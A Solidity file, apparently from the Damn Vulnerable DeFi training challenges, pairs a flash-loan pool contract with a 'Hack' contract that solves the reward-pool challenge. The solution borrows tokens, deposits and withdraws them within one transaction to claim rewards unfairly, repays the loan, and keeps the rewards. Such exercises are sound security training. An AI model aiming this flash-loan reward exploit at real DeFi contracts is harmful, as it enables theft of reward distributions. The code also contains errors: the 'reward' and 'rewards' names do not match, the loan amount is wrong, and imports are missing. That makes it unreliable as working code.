pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";

/**
 * @notice A simple pool to get flash loans of DVT
 */
contract FlashLoanerPool is ReentrancyGuard {
    using Address for address payable;

    DamnValuableToken public liquidityToken;

    constructor(address liquidityTokenAddress) public {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
    }

    function flashLoan(uint256 amount) external nonReentrant {
        uint256 balanceBefore = liquidityToken.balanceOf(address(this));
        require(amount <= balanceBefore, "Not enough token balance");

        require(
            msg.sender.isContract(),
            "Borrower must be a deployed contract"
        );

        liquidityToken.transfer(msg.sender, amount);

        (bool success, ) = msg.sender.call(
            abi.encodeWithSignature("receiveFlashLoan(uint256)", amount)
        );
        require(success, "External call failed");

        require(
            liquidityToken.balanceOf(address(this)) >= balanceBefore,
            "Flash loan not paid back"
        );
    }
}

contract Hack {
    FlashLoanerPool public pool;
    DamnValuableToken public token;
    TheRewarderPool public rewardPool;
    RewardToken public reward;

    constructor(
        address _pool,
        address _token,
        address _rewardPool,
        address _rewards
    ) {
        pool = FlashLoanerPool(_pool);
        token = DamnValuableToken(_token);
        rewardPool = TheRewarderPool(_rewardPool);
        rewards = RewardToken(_rewards);
    }

    fallback() external {
        uint bal = token.balanceOf(address(this));
        token.approve(address(rewardPool), bal);
        rewardPool.deposit(bal);
        rewardPool.withdraw(bal);
        token.transfer(address(pool), bal);
    }

    function attack() external {
        pool.flashLoan(token.balanceOf(address(this)));
        reward.transfer(msg.sender, reward.balanceOf(address(this)));
    }
}
